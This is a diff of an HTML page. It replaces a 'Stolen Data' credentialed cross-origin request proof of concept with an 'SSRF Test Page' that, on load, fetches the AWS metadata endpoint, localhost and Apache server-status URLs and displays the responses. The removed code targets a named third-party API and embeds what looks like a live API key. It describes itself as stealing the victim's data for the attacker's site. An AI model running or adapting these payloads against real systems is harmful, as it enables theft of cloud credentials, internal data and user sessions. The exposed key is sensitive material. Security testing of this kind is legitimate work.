@@ -3,46 +3,57 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Stolen Data</title>
+    <title>SSRF Test Page</title>
+    <style>
+        body { font-family: Arial, sans-serif; }
+        .container { max-width: 600px; margin: 50px auto; text-align: center; }
+        #ssrfResult { margin-top: 20px; padding: 10px; border: 1px solid #ddd; background-color: #f9f9f9; display: none; }
+        pre { text-align: left; }
+    </style>
 </head>
 <body>
-    <h1>Stolen Data from Victim Site</h1>
-    <div id="stolen-data">
-        <!-- Stolen data will appear here -->
-    </div>
+    <div class="container">
+        <h1>SSRF Testing Page</h1>
+        <p>This page attempts to fetch data from common internal services to test for SSRF vulnerabilities.</p>
+        
+        <!-- SSRF Results will be displayed here -->
+        <div id="ssrfResult">
+            <h2>SSRF Request Data</h2>
+            <pre id="resultData"></pre>
+        </div>
 
-    <script>
-        // Create an XMLHttpRequest object to make a request to the vulnerable site
-        var xhr = new XMLHttpRequest();
-        
-        // Open a GET request to the target URL on the victim site
-        xhr.open('GET', 'https://www.jaguar.here.com/v1/browse?apiKey=sOp9lrUJDOgPABtkVdTXdoNSSe3iofUIjiWcKe-7Z1M&categoiries=car-dealer-repair&chains=322&at=52.520008%2C13.404954000000002&limit=50&lang=en-GB&t=m295tdxq&callback=Request.JSONP.request_map.request_2', true);
-        
-        // Set withCredentials to include cookies and authentication tokens
-        xhr.withCredentials = true;
-        
-        // Handle the response
-        xhr.onload = function() {
-            if (xhr.status === 200) {
-                // Get the response text (stolen data)
-                var stolenData = xhr.responseText;
+        <script>
+            // Function to fetch from multiple potential internal services and log the result
+            const logSSRF = async () => {
+                const urls = [
+                    'http://169.254.169.254/latest/meta-data/',  // AWS Metadata
+                    'http://127.0.0.1/',                        // Localhost
+                    'http://localhost/',                        // Localhost
+                    'http://127.0.0.1/server-status',           // Apache server-status
+                    'http://localhost/server-status'            // Apache server-status
+                ];
+
+                let result = '';
                 
-                // Display the stolen data directly on the attacker's site
-                document.getElementById('stolen-data').innerText = stolenData;
-            } else {
-                document.getElementById('stolen-data').innerText = 
-                    'Failed to fetch data. Status: ' + xhr.status + ' (' + xhr.statusText + ')';
-            }
-        };
-        
-        // Handle errors
-        xhr.onerror = function() {
-            document.getElementById('stolen-data').innerText = 'Error occurred while fetching data.';
-        };
+                for (const url of urls) {
+                    try {
+                        let response = await fetch(url, { method: 'GET' });
+                        let data = await response.text();
+                        result += `Fetched from ${url}:\n${data}\n\n`;
+                    } catch (error) {
+                        result += `Error fetching from ${url}: ${error.message}\n\n`;
+                    }
+                }
 
-        // Send the request
-        xhr.send();
-    </script>
+                // Display the results on the webpage
+                document.getElementById('ssrfResult').style.display = 'block';
+                document.getElementById('resultData').innerText = result;
+            };
+
+            // Trigger the logging function when the page loads
+            logSSRF();
+        </script>
+    </div>
 </body>
 </html>
 
